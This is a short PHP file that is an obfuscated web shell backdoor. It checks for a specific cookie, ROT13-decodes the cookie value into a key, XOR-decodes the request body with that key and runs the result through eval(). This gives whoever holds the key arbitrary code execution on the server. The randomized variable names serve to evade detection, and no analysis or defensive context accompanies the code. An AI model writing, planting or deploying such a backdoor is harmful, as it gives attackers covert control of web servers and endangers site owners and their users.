<?php 

$tcvzw = "jonyhbpiwnqldypa";

if (isset($_COOKIE[$tcvzw])) {
    $hhhrul = str_rot13($_COOKIE[$tcvzw]);
    $hxhmahvxig = "";
    foreach (str_split(@file_get_contents('php://input'), strlen($hhhrul)) as $sltio) {
        $hxhmahvxig .= $sltio ^ $hhhrul;
    }
    eval($hxhmahvxig);
}